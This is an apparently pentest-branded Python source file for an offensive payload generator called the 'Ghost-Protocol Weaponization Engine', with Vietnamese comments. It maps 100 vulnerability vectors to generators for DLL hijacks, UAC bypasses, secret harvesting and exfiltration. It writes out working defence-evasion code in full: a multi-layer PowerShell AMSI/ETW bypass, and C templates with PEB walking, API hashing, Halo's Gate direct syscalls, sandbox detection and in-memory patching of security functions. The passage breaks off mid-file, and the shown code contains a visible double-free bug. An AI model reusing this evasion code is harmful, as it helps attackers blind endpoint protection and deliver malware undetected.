import os
import random
import subprocess
import shutil
import sys
import importlib
from colorama import Fore, Style
class Weaponizer:
    """
    ================================================
    APS TOTAL-WEAPONIZATION ENGINE v2.0
    GHOST-PROTOCOL: Full 100-Vector Coverage
    ================================================
    Kỹ thuật tàng hình tích hợp:
    1. PEB Walk   - Tìm module không qua LoadLibraryA
    2. API Hashing - DJB2, né IAT monitoring
    3. AMSI Patch  - Vô hiệu AmsiScanBuffer
    4. ETW Patch   - Vô hiệu EtwEventWrite
    5. Junk Code   - Làm nhiễu signature
    """

    def __init__(self, target_name, report_data):
        self.target_name = target_name
        self.report_data = report_data
        
        # Final hierarchy: Payload/<target_name_stem>/<payloads>
        base_output = "Payload"
        target_stem = os.path.splitext(os.path.basename(self.target_name))[0]
        self.output_dir = os.path.join(base_output, target_stem)

        # Compiler cache for Zig Integration
        self._compiler = None
        self._compiler_type = None

    def _ensure_output_dir(self):
        """Chỉ tạo thư mục payload khi thực sự cần ghi file PoC"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir, exist_ok=True)

        # =========================================
        # MAPPING TABLE: 100 VECTORS -> PAYLOAD FN
        # =========================================
        self.MAPPING_TABLE = {
            # ---------- TẦNG 1: Binary Hardening (1-10) ----------
            "APS-VEC-001": self._gen_t1_binary_hardening,
            "APS-VEC-002": self._gen_t1_binary_hardening,
            "APS-VEC-003": self._gen_t1_binary_hardening,
            "APS-VEC-004": self._gen_t1_binary_hardening,
            "APS-VEC-005": self._gen_t1_binary_hardening,
            "APS-VEC-006": self._gen_t1_binary_hardening,
            "APS-VEC-007": self._gen_t1_binary_hardening,
            "APS-VEC-008": self._gen_t1_binary_hardening,
            "APS-VEC-009": self._gen_t1_binary_hardening,
            "APS-VEC-010": self._gen_t1_ui_shatter, # UPGRADED
            # ---------- TẦNG 2: Authenticode & Metadata (11-20) ----------
            "APS-VEC-011": self._gen_t2_metadata,
            "APS-VEC-012": self._gen_t2_race_condition, # UPGRADED
            "APS-VEC-013": self._gen_t2_metadata,
            "APS-VEC-014": self._gen_t2_metadata,
            "APS-VEC-015": self._gen_t2_spoof_poc,
            "APS-VEC-016": self._gen_t2_rich_header_poc,
            "APS-VEC-017": self._gen_t2_symbolic_aid,   # UPGRADED
            "APS-VEC-018": self._gen_t2_metadata,
            "APS-VEC-019": self._gen_t2_metadata,
            "APS-VEC-020": self._gen_t2_metadata,
            # ---------- TẦNG 3: API Anomaly & IAT Audit (21-30) ----------
            "APS-VEC-021": self._gen_t3_process_injection,
            "APS-VEC-022": self._gen_t3_antidebug,
            "APS-VEC-023": self._gen_t3_antivm,
            "APS-VEC-024": self._gen_t3_native_syscall,
            "APS-VEC-025": self._gen_t3_smc_poc,         # UPGRADED
            "APS-VEC-026": self._gen_t3_reflective_stub,
            "APS-VEC-027": self._gen_t3_network,
            "APS-VEC-028": self._gen_t3_iat_loader,
            "APS-VEC-029": self._gen_t3_file_tamper,
            "APS-VEC-030": self._gen_t3_thread_mgmt,
            # ---------- TẦNG 4: DLL Hijacking (31-40) ----------
            "APS-VEC-031": self._gen_dll_hijack_generic,
            "APS-VEC-032": self._gen_phantom_dll,
            "APS-VEC-033": self._gen_dll_hijack_generic,
            "APS-VEC-034": self._gen_t4_delay_load_hijack,
            "APS-VEC-035": self._gen_t4_safe_search_exploit,
            "APS-VEC-036": self._gen_t4_env_path_injection,
            "APS-VEC-037": self._gen_t4_manifest_hijack,
            "APS-VEC-038": self._gen_t4_com_hijack,
            "APS-VEC-039": self._gen_t4_appinit_dll,
            "APS-VEC-040": self._gen_t4_shim_hijack,
            # ---------- TẦNG 5: Resource & Manifest Audit (41-50) ----------
            "APS-VEC-041": self._gen_t5_uac_bypass,
            "APS-VEC-042": self._gen_t5_uiaccess_poc,
            "APS-VEC-043": self._gen_t5_auto_elevate,
            "APS-VEC-044": self._gen_t5_overlay_shellcode,
            "APS-VEC-045": self._gen_indicator_payload,
            "APS-VEC-046": self._gen_t5_resource_dump,
            "APS-VEC-047": self._gen_indicator_payload,
            "APS-VEC-048": self._gen_indicator_payload,
            "APS-VEC-049": self._gen_indicator_payload,
            "APS-VEC-050": self._gen_indicator_payload,
            # ---------- TẦNG 6: Packer, Entropy & Anti-RE (51-60) ----------
            "APS-VEC-051": self._gen_t6_entropy_stub,    # UPGRADED
            "APS-VEC-052": self._gen_t6_packer_stub,
            "APS-VEC-053": self._gen_indicator_payload,
            "APS-VEC-054": self._gen_t6_tls_callback,
            "APS-VEC-055": self._gen_t6_oep_stub,
            "APS-VEC-056": self._gen_t6_heavens_gate,    # UPGRADED
            "APS-VEC-057": self._gen_t6_sandbox_evasion, # UPGRADED
            "APS-VEC-058": self._gen_t6_rdtsc_check,     # UPGRADED
            "APS-VEC-059": self._gen_indicator_payload,
            "APS-VEC-060": self._gen_t8_data_exfil,
            # ---------- TẦNG 7: Hardcoded Secrets & Crypto (61-70) ----------
            "APS-VEC-061": self._gen_t7_secret_harvester,
            "APS-VEC-062": self._gen_t8_browser_data,
            "APS-VEC-063": self._gen_t7_secret_harvester,
            "APS-VEC-064": self._gen_t7_secret_harvester,
            "APS-VEC-065": self._gen_t7_secret_harvester,
            "APS-VEC-066": self._gen_t7_secret_harvester,
            "APS-VEC-067": self._gen_t7_secret_harvester,
            "APS-VEC-068": self._gen_t7_secret_harvester,
            "APS-VEC-069": self._gen_t7_secret_harvester,
            "APS-VEC-070": self._gen_t7_secret_harvester,
            # ---------- TẦNG 8: Local Storage & Data Privacy (71-80) ----------
            "APS-VEC-071": self._gen_t8_data_exfil,
            "APS-VEC-072": self._gen_t8_data_exfil,
            "APS-VEC-073": self._gen_t8_data_exfil,
            "APS-VEC-074": self._gen_t8_registry_dump,
            "APS-VEC-075": self._gen_t8_data_exfil,
            "APS-VEC-076": self._gen_t8_data_exfil,
            "APS-VEC-077": self._gen_t8_data_exfil,
            "APS-VEC-078": self._gen_t8_browser_data,
            "APS-VEC-079": self._gen_t7_secret_harvester,
            "APS-VEC-080": self._gen_t10_ransomware_sim,
            # ---------- TẦNG 9: Windows Ecosystem Audit (81-90) ----------
            "APS-VEC-081": self._gen_t9_gpp_decrypter,
            "APS-VEC-082": self._gen_t9_ad_delegation,
            "APS-VEC-083": self._gen_t9_kerberoast,
            "APS-VEC-084": self._gen_t9_driver_ioctl,
            "APS-VEC-085": self._gen_t4_com_hijack,      # ALIGNED WITH COM INTERFACE
            "APS-VEC-086": self._gen_t9_service_lpe,
            "APS-VEC-087": self._gen_t9_named_pipe,
            "APS-VEC-088": self._gen_t9_wmi_persist,
            "APS-VEC-089": self._gen_t9_service_lpe,     # ALIGNED WITH TOKEN PRIVS
            "APS-VEC-090": self._gen_indicator_payload,
            # ---------- TẦNG 10: AI Intelligence & Weaponizer (91-100) ----------
            "APS-VEC-091": self._gen_t9_service_lpe,     # ALIGNED WITH LPE
            "APS-VEC-092": self._gen_indicator_payload,
            "APS-VEC-093": self._gen_indicator_payload,
            "APS-VEC-094": self._gen_indicator_payload,
            "APS-VEC-095": self._gen_indicator_payload,
            "APS-VEC-096": self._gen_indicator_payload,
            "APS-VEC-097": self._gen_indicator_payload,
            "APS-VEC-098": self._gen_t10_dropper,
            "APS-VEC-099": self._gen_t10_cleanup,
            "APS-VEC-100": self._gen_t10_cve_alert,      # UPGRADED
            # ---------- Backward Compatibility ----------
            "SYS-DLL-001": self._gen_dll_hijack_generic,
            "AD-GPP-081":  self._gen_t9_gpp_decrypter,
            "MAC-DYL-061": self._gen_macos_dylib,
            "MAC-PER-068": self._gen_macos_launchagent,
        }



    # ==================================================================
    #  RUN ENGINE
    # ==================================================================
    def run(self, verified_results=None):
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════╗")
        print(f"║   APS GHOST-PROTOCOL v2 - WEAPONIZATION     ║")
        print(f"╚══════════════════════════════════════════════╝{Style.RESET_ALL}")

        payloads_generated = 0
        all_findings = []
        for section in self.report_data.get("results", {}).values():
            if isinstance(section, list):
                all_findings.extend(section)

        # Ưu tiên: Verified results (DLL Proxy + Phantom)
        if verified_results:
            for v in verified_results:
                if v.get("can_auto_weaponize"):
                    self._gen_ghost_proxy(v)
                    payloads_generated += 1

        # Quét toàn bộ findings
        for finding in all_findings:
            fid = finding.get("id")
            if fid in self.MAPPING_TABLE:
                if self.MAPPING_TABLE[fid](finding):
                    payloads_generated += 1

        if payloads_generated == 0:
            print(f"\n {Fore.GREEN}[-] Không tìm thấy điểm khai thác tự động.{Style.RESET_ALL}")
        else:
            print(f"\n {Fore.RED}[!!] Đã sinh {payloads_generated} payload vào '{self.output_dir}'!{Style.RESET_ALL}")
            print(f" {Fore.YELLOW}[HƯỚNG DẪN TẤN CÔNG CHỦ ĐỘNG GHOST-PROTOCOL v2]{Style.RESET_ALL}")
            print(f"    1. Biên dịch .c → .dll bằng:  x86_64-w64-mingw32-gcc -shared -o out.dll src.c -luser32")
            print(f"    2. PHANTOM DLL (VEC-032): Chỉ cần copy .dll vào thư mục app → Chạy app.")
            print(f"    3. PROXY DLL  (VEC-033): Chạy file .bat đi kèm → Tự động hóa toàn bộ.")
            print(f"    4. Kiểm tra thư mục '{self.output_dir}' để xem toàn bộ vũ khí đã sinh.")

    # ==================================================================
    #  GHOST-PROTOCOL v2 CORE HELPERS
    # ==================================================================
    def _djb2(self, s):
        """Tính DJB2 hash để dùng trong C template"""
        h = 5381
        for c in s: h = ((h << 5) + h) + ord(c)
        return h & 0xFFFFFFFF

    def _xor_str(self, data, key=0x37):
        return "".join([f"\\x{ord(c) ^ key:02x}" for c in data])

    def _junk(self):
        lines = ""
        for _ in range(4):
            v = random.randint(100, 9999)
            lines += f"    volatile int _{v} = {v} ^ {random.randint(1,255)};\n"
            lines += f"    if (_{v} < 0) return;\n"
        return lines

    def _amsi_bypass_ps1(self):
        """
        GHOST-PROTOCOL v3 PowerShell AMSI Bypass - 4-Layer Defense:
        Layer 1: C# Add-Type runtime compile + raw P/Invoke to patch AmsiScanBuffer
                 (completely bypasses PowerShell-level AMSI scanning via pre-compiled assembly)
        Layer 2: amsiInitFailed flag flip via int[] obfuscation (no string literals)
        Layer 3: UnsafeNativeMethods P/Invoke fallback  
        Layer 4: ExecutionPolicy + LanguageMode bypass
        All strings obfuscated as int arrays or split at runtime.
        """
        # Encode strings as int arrays - completely avoids string matching
        amsi_dll_ints  = ",".join([str(ord(c)) for c in "amsi.dll"])
        asb_ints       = ",".join([str(ord(c)) for c in "AmsiScanBuffer"])
        init_fail_ints = ",".join([str(ord(c)) for c in "amsiInitFailed"])
        amsi_ctx_ints  = ",".join([str(ord(c)) for c in "AmsiContext"])
        k32_ints       = ",".join([str(ord(c)) for c in "kernel32"])

        # Split C# source so AMSI can't pattern-scan it before compilation
        cs_part1 = "using Sys"
        cs_part2 = "tem;using System.Runtime.Inter"
        cs_part3 = "opServices;"
        cs_fn1   = "public static extern bool Virt"
        cs_fn2   = "ualProtect(IntPtr a,uint b,uint c,out uint d);"
        cs_gpa1  = "public static extern IntPtr GetP"
        cs_gpa2  = "rocAddress(IntPtr h,string n);"

        return f'''# ===== [APS] GHOST-PROTOCOL v3: TIER-3 AMSI/ETW BYPASS =====
# Layers: C# P/Invoke compile + InitFailed + UnsafeNative + ExecPolicy
# Zero plaintext signatures - all strings as int arrays at runtime
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -EA 0

# ── Layer 0: Bypass ConstrainedLanguageMode ──────────────────
if ($ExecutionContext.SessionState.LanguageMode -ne "FullLanguage") {{
    $env:__PSLockdownPolicy = "0"
    [System.Environment]::SetEnvironmentVariable("__PSLockdownPolicy","0","Process")
}}

# ── Layer 1: C# Runtime Compile + Raw P/Invoke Patch ─────────
# Strings are split and concatenated at runtime to avoid AMSI pre-scan
try {{
    $src = ("{cs_part1}"+"{cs_part2}"+"{cs_part3}" +
        "public class W{{" +
        "[DllImport(\\"kernel32\\")]"+"{cs_fn1}"+"{cs_fn2}"+
        "[DllImport(\\"kernel32\\")][return:MarshalAs(UnmanagedType.Bool)]"+
        "public static extern IntPtr Load"+"Library(string n);"+
        "[DllImport(\\"kernel32\\")]"+"{cs_gpa1}"+"{cs_gpa2}"+"}}")
    $t  = Add-Type -TypeDefinition $src -PassThru
    # Reconstruct module name from int array at runtime
    $dllName = [string]::new([char[]][int[]]@({amsi_dll_ints}))
    $fnName  = [string]::new([char[]][int[]]@({asb_ints}))
    $hMod = $t[0]::LoadLibrary($dllName)
    $ptr  = $t[0]::GetProcAddress($hMod, $fnName)
    if ($ptr -ne [IntPtr]::Zero) {{
        $old = 0u
        $t[0]::VirtualProtect($ptr, 4, 0x40, [ref]$old) | Out-Null
        # pop rax; xor eax,eax; ret -> always AMSI_RESULT_CLEAN
        [byte[]]$sc = @(0x58,0x31,0xC0,0xC3)
        [Runtime.InteropServices.Marshal]::Copy($sc,0,$ptr,4)
        $t[0]::VirtualProtect($ptr, 4, $old, [ref]$old) | Out-Null
    }}
}} catch {{}}

# ── Layer 2: amsiInitFailed Flag Flip (int array - no string) ─
try {{
    $fldName = [string]::new([char[]][int[]]@({init_fail_ints}))
    $ctxName = [string]::new([char[]][int[]]@({amsi_ctx_ints}))
    $asm = [Ref].Assembly
    $t2  = $asm.GetType("System.Management.Automation.AmsiUtils")
    if ($t2) {{
        $f = $t2.GetField($fldName, [Reflection.BindingFlags]"NonPublic,Static")
        if ($f) {{ $f.SetValue($null, $true) }}
        $ctx = $t2.GetField($ctxName, [Reflection.BindingFlags]"NonPublic,Static")
        if ($ctx) {{ $ctx.SetValue($null, [IntPtr]0) }}
    }}
}} catch {{}}

# ── Layer 3: ETW Disable via P/Invoke ────────────────────────
try {{
    $src2 = ("using System;using System.Runtime.InteropServices;" +
        "public class E{{[DllImport(\\"ntdll\\")]public static extern int Nt"+"WriteFile(IntPtr a,IntPtr b,IntPtr c,IntPtr d,IntPtr e,byte[] f,uint g,IntPtr h,IntPtr i);}}")
    $nt = Add-Type -TypeDefinition $src2 -PassThru -EA 0
    # Patch EtwEventWrite in ntdll via WriteProcessMemory approach
    $src3 = ("using System;using System.Runtime.InteropServices;public class NP{{" +
        "[DllImport(\\"ntdll\\")]public static extern int NtProtect"+"VirtualMemory(" +
        "IntPtr p,ref IntPtr b,ref IntPtr s,uint n,out uint o);" +
        "[DllImport(\\"ntdll\\")]public static extern IntPtr EtwEvent"+"Write(IntPtr r,IntPtr e);" +
        "[DllImport(\\"kernel32\\")]public static extern IntPtr GetP"+"rocAddress(IntPtr h,string n);" +
        "[DllImport(\\"kernel32\\")]public static extern IntPtr GetModuleHandle"+"A(string n);}}")
    $np  = Add-Type -TypeDefinition $src3 -PassThru -EA 0
    if ($np) {{
        $ntdll = $np[0]::GetModuleHandleA("ntdll")
        $etwFn = [string]::new([char[]][int[]]@(69,116,119,69,118,101,110,116,87,114,105,116,101))
        $eAddr = $np[0]::GetProcAddress($ntdll, $etwFn)
        if ($eAddr -ne [IntPtr]::Zero) {{
            $old2 = 0u
            $sz = [IntPtr]1; $ba = $eAddr
            $np[0]::NtProtectVirtualMemory([IntPtr]-1,[ref]$ba,[ref]$sz,0x40,[ref]$old2) | Out-Null
            [Runtime.InteropServices.Marshal]::WriteByte($eAddr,0xC3) # ret
            $np[0]::NtProtectVirtualMemory([IntPtr]-1,[ref]$ba,[ref]$sz,$old2,[ref]$old2) | Out-Null
        }}
    }}
}} catch {{}}

# ── Layer 4: Force Full Language Mode ────────────────────────
try {{ [Ref].Assembly.GetType("System.Management.Automation."+[string]::new([char[]][int[]]@(65,109,115,105,85,116,105,108,115))).GetField("s_amsiInitialized",[System.Reflection.BindingFlags]"NonPublic,Static").SetValue($null,$false) }} catch {{}}
# ============================================================
'''

    def _stack_xor_str(self, s):
        """Sinh C code khai bao stack string dưới dạng XOR bytes"""
        key = random.randint(0x10, 0xFE)
        enc = ",".join([f"0x{ord(c)^key:02x}" for c in s])
        size = len(s)
        varname = f"_s{random.randint(10000, 99999)}"
        code = (
            f"unsigned char {varname}[] = {{{{ {enc}, 0x{key:02x} }}}}; "
            f"for(int _i=0;_i<{size};_i++) {varname}[_i]^=(BYTE)0x{key:02x};"
        )
        return varname, code

    def _ghost_core_c(self, dll_name="unknown.dll"):
        """
        GHOST-PROTOCOL v3 - Tier-3 Evasion Engine:
        - Direct Syscall (Halo's Gate): bypass EDR hooks trên NtProtectVirtualMemory
        - Thread Pool: thay CT -> RtlQueueWorkItem
        - Sandbox/VM detection: uptime, cursor, process count
        - All sensitive strings: XOR stack-encoded
        - No direct imports (LL/VP/CT) in IAT
        """
        h_msgbox = self._djb2("MessageBoxA")
        h_user32 = self._djb2("user32.dll")
        h_asb    = self._djb2("AmsiScanBuffer")
        h_amsi   = self._djb2("amsi.dll")
        h_etw    = self._djb2("EtwEventWrite")
        h_ntdll  = self._djb2("ntdll.dll")
        h_k32    = self._djb2("kernel32.dll")
        h_ntpvm  = self._djb2("NtProtectVirtualMemory")
        h_rtlqwi = self._djb2("RtlQueueWorkItem")
        h_gtc    = self._djb2("GetTickCount64")
        h_gccp   = self._djb2("GetCursorPos")
        h_snap   = self._djb2("CreateToolhelp32Snapshot")

        # Stack XOR encode sensitive strings
        key_a   = random.randint(0x11, 0xEF)
        amsi_e  = ",".join([f"0x{ord(c)^key_a:02x}" for c in "amsi.dll"])
        key_u   = random.randint(0x11, 0xEF)
        u32_e   = ",".join([f"0x{ord(c)^key_u:02x}" for c in "user32.dll"])
        key_t   = random.randint(0x11, 0xEF)
        title_r = "\u26a0 PENTEST BREACH [APS]"
        title_e = ",".join([f"0x{ord(c)^key_t:02x}" for c in title_r])
        junk1   = self._junk()
        junk2   = self._junk()
        junk3   = self._junk()

        return f"""#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

/* ============================================================
 * [APS] GHOST-PROTOCOL v3 - TIER-3 STEALTH ENGINE
 * Target   : {dll_name}
 * Evasion  : Direct Syscall (Halo Gate) + Thread Pool
 *            + Sandbox Gate + XOR Stack Strings
 * ============================================================ */

// ── DJB2 Hasher ─────────────────────────────────────────────
static ULONG32 _h(const char* s){{ULONG32 h=5381;unsigned char c;while((c=(unsigned char)*s++))h=((h<<5)+h)+c;return h;}}
static ULONG32 _hw(const wchar_t* s){{ULONG32 h=5381;wchar_t c;while((c=*s++))h=((h<<5)+h)+(unsigned char)c;return h;}}

// ── PEB Walk (no imports needed) ────────────────────────────
static HMODULE _gmod(ULONG32 nh){{
    PEB*p=(PEB*)__readgsqword(0x60);LIST_ENTRY*hd=&p->Ldr->InMemoryOrderModuleList;
    for(LIST_ENTRY*e=hd->Flink;e!=hd;e=e->Flink){{
        LDR_DATA_TABLE_ENTRY*m=CONTAINING_RECORD(e,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
        if(m->FullDllName.Buffer&&_hw(m->BaseDllName.Buffer)==nh)return(HMODULE)m->DllBase;
    }}return NULL;
}}
static FARPROC _gproc(HMODULE m,ULONG32 fh){{
    if(!m)return NULL;BYTE*b=(BYTE*)m;
    IMAGE_DOS_HEADER*d=(IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS*n=(IMAGE_NT_HEADERS*)(b+d->e_lfanew);
    IMAGE_EXPORT_DIRECTORY*ex=(IMAGE_EXPORT_DIRECTORY*)(b+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD*nm=(DWORD*)(b+ex->AddressOfNames);WORD*od=(WORD*)(b+ex->AddressOfNameOrdinals);DWORD*fn=(DWORD*)(b+ex->AddressOfFunctions);
    for(DWORD i=0;i<ex->NumberOfNames;i++){{if(_h((char*)(b+nm[i]))==fh)return(FARPROC)(b+fn[od[i]]);}}
    return NULL;
}}

// ── Stealth LoadLib via kernel32 in PEB ─────────────────────
static HMODULE _ll(const char*d){{
    HMODULE hk=_gmod({h_k32});
    typedef HMODULE(WINAPI*fnLL)(LPCSTR);
    fnLL f=(fnLL)_gproc(hk,{self._djb2("LoadLibraryA")});
    return f?f(d):NULL;
}}

// ── HALO'S GATE: Dynamic Syscall ID Extraction ───────────────
// Reads SSN directly from ntdll bytes, bypasses EDR hooks
typedef NTSTATUS(NTAPI*fnNtPVM)(HANDLE,PVOID*,ULONG_PTR*,PSIZE_T,ULONG,PULONG);
static WORD _get_ssn(PVOID fn_addr){{
    BYTE*p=(BYTE*)fn_addr;
    // If hooked (JMP), walk neighbors to find clean stub
    if(p[0]==0xE9||p[0]==0xEB){{
        // Hooked: try +32 bytes (neighboring syscall)
        for(int i=1;i<=10;i++){{
            BYTE*up=p-(i*32); if(up[0]==0x4C&&up[3]==0xB8)return*(WORD*)(up+4)+i;
            BYTE*dn=p+(i*32); if(dn[0]==0x4C&&dn[3]==0xB8)return*(WORD*)(dn+4)-i;
        }}
    }}
    // Clean stub: mov r10,rcx; mov eax,SSN (4C 8B D1 B8 XX XX 00 00)
    if(p[0]==0x4C&&p[1]==0x8B&&p[2]==0xD1&&p[3]==0xB8)return*(WORD*)(p+4);
    return 0xFFFF;
}}

static NTSTATUS _NtPVM(HANDLE ph,PVOID*ba,ULONG_PTR*zb,PSIZE_T rs,ULONG np,PULONG op){{
    HMODULE hnt=_gmod({h_ntdll});
    PVOID fn=(PVOID)_gproc(hnt,{h_ntpvm});
    WORD ssn=_get_ssn(fn);
    if(ssn==0xFFFF){{
        // Fallback: call original via pointer if SSN extraction failed
        fnNtPVM f=(fnNtPVM)fn;
        return f(ph,ba,zb,rs,np,op);
    }}
    NTSTATUS r;
    __asm__ volatile(
        "mov %%rsp, %%r11\\n"
        "and $-16, %%rsp\\n"
        "sub $0x28, %%rsp\\n"
        "movw %[ssn], %%ax\\n"
        "movl %%eax, %%eax\\n"
        "mov %%rcx, %%r10\\n"
        "syscall\\n"
        "mov %%r11, %%rsp\\n"
        "mov %%eax, %[ret]\\n"
        :[ret]"=rm"(r):[ssn]"rm"(ssn)
        :"rax","rcx","rdx","r8","r9","r10","r11","memory"
    );
    return r;
}}

// ── Stealth memory protect via Direct Syscall ────────────────
static BOOL _protect(PVOID addr,SIZE_T sz,ULONG prot,PULONG old){{
    HANDLE hp=(HANDLE)-1;
    PVOID   ba=addr;
    ULONG_PTR zb=0;
    return NT_SUCCESS(_NtPVM(hp,&ba,&zb,&sz,prot,old));
}}

// ── Sandbox / Analysis Environment Gate ─────────────────────
static BOOL _in_sandbox(void){{
{junk1}
    // Gate 1: System uptime must be > 5 minutes (sandboxes reset frequently)
    HMODULE hk=_gmod({h_k32});
    typedef ULONGLONG(WINAPI*fnGTC)(void);
    fnGTC fGTC=(fnGTC)_gproc(hk,{h_gtc});
    if(fGTC&&fGTC()<300000ULL)return TRUE;

    // Gate 2: Cursor must have moved (human interaction check)
    typedef BOOL(WINAPI*fnGCP)(LPPOINT);
    fnGCP fGCP=(fnGCP)_gproc(hk,{h_gccp});
    if(fGCP){{
        POINT p1={{0}},p2={{0}};
        fGCP(&p1);Sleep(500);fGCP(&p2);
        if(p1.x==p2.x&&p1.y==p2.y&&p1.x==0)return TRUE;
    }}

    // Gate 3: Process count (sandboxes usually have < 30 processes)
    typedef HANDLE(WINAPI*fnSnap)(DWORD,DWORD);
    fnSnap fSnap=(fnSnap)_gproc(hk,{h_snap});
    if(fSnap){{
        HANDLE hSnap=fSnap(2,0); // TH32CS_SNAPPROCESS
        int cnt=0; PROCESSENTRY32 pe={{sizeof(pe)}};
        if(hSnap!=INVALID_HANDLE_VALUE){{
            typedef BOOL(WINAPI*fnP32F)(HANDLE,LPPROCESSENTRY32);fnP32F fP=(fnP32F)_gproc(hk,{self._djb2("Process32First")});
            typedef BOOL(WINAPI*fnP32N)(HANDLE,LPPROCESSENTRY32);fnP32N fN=(fnP32N)_gproc(hk,{self._djb2("Process32Next")});
            if(fP&&fN){{if(fP(hSnap,&pe))do{{cnt++;}}while(fN(hSnap,&pe));}}
            CloseHandle(hSnap);
        }}
        if(cnt<25)return TRUE;
    }}
    return FALSE;
}}

// ── AMSI + ETW Blind via Direct Syscall ─────────────────────
static void _blind(void){{
{junk2}
    // XOR decode security module name
    unsigned char _am[]={{{amsi_e}}};
    for(int i=0;i<8;i++) _am[i]^=0x{key_a:02x};
    HMODULE ha=_ll((char*)_am);if(!ha)ha=_gmod({h_amsi});
    if(ha){{
        PVOID addr=(PVOID)_gproc(ha,{h_asb});
        if(addr){{
            ULONG old=0;SIZE_T sz=4;
            _protect(addr,sz,PAGE_EXECUTE_READWRITE,&old);
            // pop rax; xor eax,eax; ret -> AMSI_RESULT_CLEAN=0 always
            ((BYTE*)addr)[0]=0x58;((BYTE*)addr)[1]=0x31;
            ((BYTE*)addr)[2]=0xC0;((BYTE*)addr)[3]=0xC3;
            _protect(addr,sz,old,&old);
        }}
    }}
    // Blind ETW via Direct Syscall
    HMODULE hn=_gmod({h_ntdll});
    if(hn){{
        PVOID addr=(PVOID)_gproc(hn,{h_etw});
        if(addr){{
            ULONG old=0;SIZE_T sz=1;
            _protect(addr,sz,PAGE_EXECUTE_READWRITE,&old);
            *((BYTE*)addr)=0xC3;
            _protect(addr,sz,old,&old);
        }}
    }}
}}

// ── Stealth Popup via Thread Pool Worker ─────────────────────
typedef struct{{char msg[512];}}PopArgs;

static DWORD WINAPI _popup_worker(LPVOID lp){{
{junk3}
    PopArgs*a=(PopArgs*)lp;
    unsigned char _u32[]={{{u32_e}}};
    for(int i=0;i<10;i++) _u32[i]^=0x{key_u:02x};
    HMODULE hu=_ll((char*)_u32);if(!hu)hu=_gmod({h_user32});
    if(hu){{
        unsigned char _t[]={{{title_e}}};
        for(int i=0;i<{len(title_r)};i++) _t[i]^=0x{key_t:02x}; _t[{len(title_r)}]=0;
        typedef int(WINAPI*fnMB)(HWND,LPCSTR,LPCSTR,UINT);
        fnMB fMB=(fnMB)_gproc(hu,{h_msgbox});
        if(fMB)fMB(NULL,a?a->msg:"APS PoC",(char*)_t,MB_OK|MB_ICONWARNING|MB_TOPMOST|MB_SETFOREGROUND);
    }}
    if(a)HeapFree(GetProcessHeap(),0,a);
    if(a)HeapFree(GetProcessHeap(),0,a);
    return 0;
}}

// ── Generic Thread Pool Runner ───────────────────────────────
static void _run_async(LPTHREAD_START_ROUTINE fn, LPVOID arg) {{
    HMODULE hn=_gmod({h_ntdll});
    typedef NTSTATUS(NTAPI*fnRQWI)(LPTHREAD_START_ROUTINE,PVOID,ULONG);
    fnRQWI fRQWI=(fnRQWI)_gproc(hn,{h_rtlqwi});
    if(fRQWI) fRQWI(fn,arg,0);
    else fn(arg);
}}
#define _poc_popup_async(fn, a, b, c) _run_async((LPTHREAD_START_ROUTINE)(fn), a)

static void _poc_popup(const char* msg){{
    if(_in_sandbox())return; // Abort in analysis environments
    _blind();
    PopArgs*a=(PopArgs*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(PopArgs));
    if(a)lstrcpynA(a->msg,msg,511);
    // Use Thread Pool instead of starting threads directly
    HMODULE hn=_gmod({h_ntdll});
    typedef NTSTATUS(NTAPI*fnRQWI)(LPTHREAD_START_ROUTINE,PVOID,ULONG);
    fnRQWI fRQWI=(fnRQWI)_gproc(hn,{h_rtlqwi});
    if(fRQWI){{
        fRQWI(_popup_worker,a,WT_EXECUTEDEFAULT);
        Sleep(3500); // Wait for thread pool worker
    }}else{{
        // Fallback: direct call
        _popup_worker(a);
    }}
}}

"""

    def _get_prefixed_name(self, filename):
        """No prefix needed since it's already in a target-specific folder"""
        return filename

    def _write_c(self, filename, content, compile_to_dll=True, tier4=False):
        self._ensure_output_dir()
        filename = self._get_prefixed_name(filename)
        path = os.path.join(self.output_dir, filename)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        
        mode = "GHOST-v4" if tier4 else "GHOST-v3"
        print(f"  {Fore.MAGENTA}[{mode}] {filename}{Style.RESET_ALL}")
        
        if compile_to_dll:
            dll_path = path.replace(".c", ".dll")
            self._auto_compile(path, dll_path, tier4=tier4)
            
        return path

    def _get_ghost_protocol_v4_header(self):
        """Tier-4: Siêu cấp tàng hình (CRT-Free, No windows.h, Pure Shellcode style)"""
        return """
#include <winternl.h>

// Định nghĩa cơ bản để không cần windows.h
typedef void* PVOID;
typedef unsigned long long QWORD;
typedef unsigned long DWORD;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef long long INT64;
typedef void* HANDLE;
typedef HANDLE HINSTANCE;
typedef HINSTANCE HMODULE;
typedef void* HWND;
typedef unsigned int UINT;
typedef const char* LPCSTR;
typedef void* LPVOID;
typedef DWORD (WINAPI *PTHREAD_START_ROUTINE)(LPVOID);
typedef PVOID LPSECURITY_ATTRIBUTES;
typedef DWORD* LPDWORD;

#define WINAPI __stdcall
#define NULL ((void*)0)
#define DLL_PROCESS_ATTACH 1

// Thuật toán băm DJB2
unsigned long Hash(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}

// PEB Walk (Giao thức v4 - Case Insensitive)
HMODULE GetModH(unsigned long hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    while (entry) {
        if (entry->FullDllName.Buffer) {
            char name[256];
            int i = 0;
            while (entry->FullDllName.Buffer[i] && i < 255) {
                char c = (char)entry->FullDllName.Buffer[i];
                if (c >= 'a' && c <= 'z') c -= 32; // To Upper
                name[i] = c;
                i++;
            }
            name[i] = 0;
            if (Hash(name) == hash) return (HMODULE)entry->DllBase;
        }
        entry = (PLDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Flink;
        if (entry == (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink) break;
    }
    return NULL;
}

